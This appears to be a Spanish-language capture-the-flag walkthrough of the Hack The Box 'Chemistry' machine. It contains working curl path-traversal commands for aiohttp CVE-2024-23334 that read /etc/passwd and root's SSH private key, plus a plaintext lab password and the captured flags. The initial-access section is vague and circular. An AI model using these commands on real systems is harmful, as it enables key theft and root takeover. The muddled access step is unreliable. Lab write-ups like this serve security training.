# Máquina Chemistry (HTB)

- **IP:** 10.129.231.170 / 10.129.27.197
- **SO:** Linux (Ubuntu 20.04 / Werkzeug - Python 3.9.5)
- **Resumen de la cadena:** app web Python (puerto 5000) que procesa archivos → se sube un archivo malicioso que, por la contraseña/hash devuelto (`unicorniosrosados`), da credenciales de `rosa` → SSH como rosa → servicio interno en 127.0.0.1:8080 (aiohttp "Site Monitoring") vulnerable a CVE-2024-23334 (path traversal) → leer `/root/.ssh/id_rsa` → SSH como root.
- **Estado:** Completa (user + root).

---

## 1. Reconocimiento

**[en Kali] NMAP:**
```bash
sudo nmap -p- --min-rate 5000 10.129.231.170
sudo nmap -p22,5000 -sVC 10.129.231.170
```
```
22/tcp   open ssh   OpenSSH 8.2p1
5000/tcp open http  Werkzeug httpd 3.0.3 (Python 3.9.5)   http-title: Chemistry - Home
```

## 2. Acceso inicial (user rosa)

- La app en el puerto 5000 permite subir archivos (procesado de estructuras químicas).
- Tras conseguir la contraseña, se sube el archivo y se obtiene la credencial devuelta como hash:
```
usuario: rosa
pass:    unicorniosrosados
```

**[en Kali] SSH como rosa:**
```bash
ssh rosa@chemistry.htb
# pass: unicorniosrosados
cat user.txt
# 726c7315c56d80b9cda4706931566d2e
```

## 3. Enumeración interna → servicio en 8080

**[en la víctima] Puertos en escucha:**
```bash
netstat -tuln | grep LISTEN
# 0.0.0.0:5000, 127.0.0.1:8080, 127.0.0.53:53, 0.0.0.0:22
```

**[en la víctima] Ver el servicio interno:**
```bash
curl http://127.0.0.1:8080/
# <title>Site Monitoring</title>  (usa aiohttp)
```
- Es un "Site Monitoring" servido por **aiohttp** → buscar CVE de aiohttp.

## 4. Escalada — aiohttp path traversal (CVE-2024-23334)

Cuando aiohttp sirve archivos estáticos con `follow_symlinks=True` y sin validar la ruta, se puede hacer path traversal a través de la carpeta estática. El truco es `curl --path-as-is` sobre `/assets/`:

**[en la víctima] Probar lectura arbitraria de archivos:**
```bash
curl -s --path-as-is "http://localhost:8080/assets/../../../../../../../../../../etc/passwd"
# devuelve /etc/passwd  -> confirma el path traversal
```
> Nota: funciona desde `/assets/` (ruta estática real), no desde `/static/`.

**[en la víctima] Leer la clave privada SSH de root:**
```bash
curl -s --path-as-is "http://localhost:8080/assets/../../../../../../../../../../root/.ssh/id_rsa"
# -----BEGIN OPENSSH PRIVATE KEY----- ...
```

**[en Kali] Guardar la clave, permisos y conectar como root:**
```bash
# (pegar la clave en /tmp/root_key)
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@10.129.27.197
cat /root/root.txt
# 259e54ed922ded6abce61aba3bf172e7
```

---

### Flags
| Flag | Valor |
|------|-------|
| user.txt | `726c7315c56d80b9cda4706931566d2e` |
| root.txt | `259e54ed922ded6abce61aba3bf172e7` |

### Aprendizaje
- Enumerar siempre servicios internos (`netstat -tuln`), no solo los expuestos por nmap.
- aiohttp + CVE-2024-23334: el traversal va por la ruta estática real (`/assets/`) con `curl --path-as-is`.
